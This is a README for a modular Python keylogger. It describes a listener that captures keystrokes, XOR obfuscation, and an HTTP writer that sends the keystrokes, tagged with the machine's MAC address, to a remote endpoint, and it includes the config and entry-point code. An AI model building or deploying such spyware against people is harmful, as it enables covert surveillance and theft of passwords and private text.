# KeyLogger Project

### Overview

This project is a modular keylogger implemented in Python. The system is designed with clear separation of concerns:

* **Listener** â€“ captures keyboard input.
* **Container** â€“ stores captured key events in batches over time.
* **Encryption** â€“ encodes key data before sending.
* **Saving / Writers** â€“ sends data to a destination (e.g., HTTP endpoint).
* **Manager** â€“ coordinates listener, container, encryption, and saving.

---

## Project Structure

```
project/
â”œâ”€ keylogger/
â”‚  â”œâ”€ __init__.py
â”‚  â”œâ”€ main.py                # Entry point
â”‚  â”œâ”€ manager.py             # KeyLoggerManager class
â”‚  â”œâ”€ listener.py            # Listener interface / concrete listener
â”‚  â”œâ”€ container.py           # Container class
â”œâ”€ encryptions/
â”‚  â”œâ”€ __init__.py
â”‚  â”œâ”€ xor.py                 # XOR encryption implementation
â”œâ”€ writers/
â”‚  â”œâ”€ __init__.py
â”‚  â”œâ”€ networkWriter.py       # HttpWriter class for sending data
â”œâ”€ utils/
â”‚  â”œâ”€ __init__.py
â”‚  â”œâ”€ conversions_utils.py   # Time conversion utilities
â”‚  â”œâ”€ network_utils.py       # get_mac_address()
â”œâ”€ config.py                 # Configuration dictionary
â””â”€ README.md
```

---

## Installation

1. Clone the repository:

```bash
git clone https://github.com/XXXXXX/keylogger.git
cd keylogger
```

2. Create a virtual environment:

```bash
python3 -m venv venv
source venv/bin/activate  # Linux/macOS
# or
venv\Scripts\activate     # Windows
```

3. Install dependencies:

```bash
pip install -r requirements.txt
```

Dependencies:

* `pynput` â€“ to capture keyboard events
* `requests` â€“ to send data over HTTP

---

## Configuration

All parameters are defined in `config.py`:

```python
from encryptions.xor import Xor
from utils.network_utils import get_mac_address
from writers.networkWriter import HttpWriter

CONFIG = {
    "destination": 'http://127.0.0.1:5000/update',
    "saving": HttpWriter,
    "save_interval_value": 1,
    "save_interval_unit": 'seconds',
    "container_interval_value": 1,
    "container_interval_units": 'seconds',
    "encryption": Xor,
    "key_encryption": 7,
    "machine_id": get_mac_address()
}
```

* **destination** â€“ HTTP endpoint for sending data
* **saving** â€“ Writer class to handle saving/transmitting
* **save\_interval\_value/unit** â€“ Frequency to flush container and send data
* **container\_interval\_value/unit** â€“ Frequency to create a new container batch
* **encryption** â€“ Encryption class to encode keystrokes
* **key\_encryption** â€“ Key for encryption
* **machine\_id** â€“ Unique machine identifier (MAC address)

---

## Usage

```python
from keylogger.manager import KeyLoggerManager
from config import CONFIG

if __name__ == "__main__":
    manager = KeyLoggerManager(
        destination=CONFIG["destination"],
        saving=CONFIG["saving"],
        save_interval_value=CONFIG["save_interval_value"],
        save_interval_unit=CONFIG["save_interval_unit"],
        container_interval_value=CONFIG["container_interval_value"],
        container_interval_unit=CONFIG["container_interval_units"],
        encryption=CONFIG["encryption"],
        key_encryption=CONFIG["key_encryption"],
        machine_id=CONFIG["machine_id"]
    )
    manager.run()
```

---

## Components

### `KeyLoggerManager`

* Coordinates the **listener**, **container**, **encryption**, and **saving**.
* Runs a worker thread to periodically flush the container and send encrypted data.

### `Container`

* Stores captured keystrokes in time-based batches.
* Thread-safe using `Lock`.
* Supports `add()`, `pop_ready()`, and `flush()`.

### `Listener`

* Abstract interface (`IListener`) for capturing keyboard input.
* Concrete implementations capture keystrokes using `pynput.keyboard`.

### `Encryption`

* Abstract base class (`Encryption`) with `encode()` method.
* `Xor` class provides XOR-based encryption of keystrokes.

### `Writers`

* Abstract writer interface for saving/transmitting data.
* `HttpWriter` sends encrypted data to a remote server.

### `Utils`

* `conversions_utils.py` â€“ converts time units to seconds.
* `network_utils.py` â€“ provides `get_mac_address()` to retrieve the machine's MAC address.

---

## Notes

* Each component is in its own file to ensure modularity and maintainability.
* Configuration is centralized in `config.py` for easy modification.
* Designed to run cross-platform with `pynput` and `requests`.

ðŸ’¡ Tip: Always test in a safe environment. This project captures keystrokes and should **never** be run on systems you donâ€™t own or without consent.
